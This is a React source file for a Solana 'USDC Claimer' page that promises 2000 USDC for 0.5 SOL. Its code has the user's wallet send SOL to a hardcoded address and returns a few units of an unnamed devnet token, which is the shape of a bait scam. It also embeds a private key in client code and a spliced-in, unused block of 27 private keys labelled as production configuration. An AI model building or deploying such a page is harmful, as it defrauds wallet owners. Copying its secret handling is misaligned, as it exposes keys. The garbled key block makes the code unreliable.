/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "LBx2cc5DxhytGs1k1poAdPcbXSYNMtzcg7twSrTX472zoZQzn59DKAZm1NpmvZBNPWB5WB2NKaDp91cDGK6C39B"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5UwpAFC8aNpq7dRNX61LJ8Pu2T2f55nweeXsg4L4DfxVuejhBdnfNra6FQ3bUpMWyJbVJ1LreNbkWgHcutqswR5z",
  "key1": "5v6TJ97rviLWxqZiQ3pswjpYUaSLeEemFNv2io7CzwYV5mTJhChLCpDd7EVqgPZLVUYr3pURCNWTeCmvZsBsFtYT",
  "key2": "2pD77UnH7dupmkA2q7Zh7RUigb5PpSizxrgDbbyNjMYZZRcbh7S9UFmskHgpwuMmhndmSWbugXtSGxY5cpsB23oA",
  "key3": "2DDa2uVMKU7MUrFP9Aur5QfoMf9TmQHWYnCLukP6mR4KUo1CyNCs7xKqabiikrP6ZrQGoEq32pHQ8RqoBbdgY1B5",
  "key4": "5EbZSNAaCj2KcNe3UkmVh88rwmXHqeEMEKGMzrj7bYhsZkBTdxMKvapvCPcB9T1gA1AHidaSrjhdHWyc6rJAjiku",
  "key5": "3gwzKurybzkDUudw5ueHFVbsFN6oF3gEdRzanbrPYHT9DGc5NWLWWFLyjNMoM2y5GeNF7hyTN8iUrhSQBzTa24F6",
  "key6": "2kDUhkN2dKpPi37ya3DQenhVwQn67UbvGjDJiwb7TkMrkrqTgECTw2BGFNPrPsSa5ci8kZj7oh9KcQLMaKhQGvq7",
  "key7": "4GT8Axe9uP89BhXZATCBrwwVjRCgD5xgLUKo4gdxxwQLksU9V26LLJC4jSxyotyJ3HNVVothkxgsb5NtZM1gY3TF",
  "key8": "3T22WPsRknMdBc2iyY8r4zMYkyZEw5xVZq8eZ7m8qRxCyphJRwpeqpcxXQPAaavRLfSWDHTBXFBHTfTf26DJ7yoZ",
  "key9": "3ucqUFYiANW4eg5Kp5ngH7m45XzC1YpbswWinye8EcGVmFskNU2xbqANqDCvZc62tvLwdXTpn2aKwkmrJVABmZUD",
  "key10": "2oMQasK87nsyDQfKBWZBkXV9n9QVf6j5cNAtm2Wcu5tNDVaC4ZZfJ3h3bghkUJo1mfaY35SJJCkEcZqfz2gRADZT",
  "key11": "nNqBwxsMY5vpFg3vGRFxEjZ5NNVA4wK1DE6Ggom8qvUC4iUBsYqCbxURFRZj3qqTYgbCGGC88BbWwgNXFdTcmG4",
  "key12": "sE1aq9ac9647RmMxiiE1MZ7TPCSh1tpsZXEbo4MzJhWVjoKrXWYSLLJCSqokdyrzdpgtAbu9p1CrgCcSJCy5TNF",
  "key13": "3ExtWjSFgujHxqqNAp6LvEapFqeedumQC4BBHz3iTK51KhmeMwjddZpiEqcesj7NsAoQcgLVADg578QTfdBSQFfE",
  "key14": "EXgyhXitTAbLuAeVtnGgoZCtFeUNsYWHduEoYnjK6hqHXgqWD7tamjPmSMRM4DdCMGnX7hFHcpVLcxBTnn1ooVi",
  "key15": "55Y49mtZ3L9BeoZf5Tf9KunWPbqfT4GHNdgfbprwzEJEf6qbgBn9CovcGnc8bgdW5yyL7eS4aDg3MzP8E6DM3xPC",
  "key16": "3PYFkGnKjVdPHn16PviZaWC4c2ABYLknWbaz7SpBkCKtGicKS2DAXDZ4DohNxSi47X4eWpyQa1nkYhPsmLbRa8XM",
  "key17": "5pfQnRbX6hakpq3EroUBQnqnmRU6mtD6z29Bs3PK7PjUsAXCoCH3f5u9yisN4k6ASDrSavdMsgDzASd9jovWSmQE",
  "key18": "63jaa3bzAiUJybrbMhXkg1mizPUwojDwTgk2ia1XojKJwmw667aYpn3KNeAkySRnUuTM7fREL5rHSRUtTX8fHUgt",
  "key19": "5kRGkub8jXU87pWuZCaKYKq27RP7R9todm12cnHgTRysvsDmQGe4U6gvn1ExK6uwuBm3ku36UMttbxYXPVmvRbKi",
  "key20": "5Wzxijxj6xNykH5r9JuFR2GbN4U1w1gH9n8yYeScztXwh5CF1MvvhbvE7rccegZgzeKn51PN8CJy4jS374b7Rza6",
  "key21": "8BSHkTKHzxZfy3z99riKgYTZu2jMAn7G2jeekAiGumaAU2X95HzpYc6AwLDPZcQrxDD7TJPD9Q1H6udr6CJznER",
  "key22": "3dBesdr8r2ZSWeNjjFcNcohNF4Zg6sV6w5eFBaJx7Wnz97MajhC8m8K4tmya3mpwTd2eXcGKsKPR6bNKsrtFti8A",
  "key23": "67aGJu4Rj4jAbdE4jBe5dwqSEhbh5Q9WGS81pF5yGnDhedT7paU3mXc6vWcND26YNFbAKvsgJAu2zqWVbpd853mb",
  "key24": "3wCbjSyD7dh48GVv8hauFfakp8kJi7NMfgaPRmTfy5PFfTDTyLgM8SfcCAtavnEshL7cHAeWA8bifbUXqkes5ird",
  "key25": "63eNpvDzKF26T5GAiZ8Yj7Yww4ps4Rvmk4HWcfZiJKFwSZo1LvmWK19Zm2gAcs9uXNYNqtfQsFtdFNQBW7gtSKda",
  "key26": "5jTpFFFdAXfj5MBC8TKjpHp1Fw4o9F1WADYYXaqWY4MScLB3bv4znSnZctipPRPAopG9iUVRdf8U9id7X1NFkKP8"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
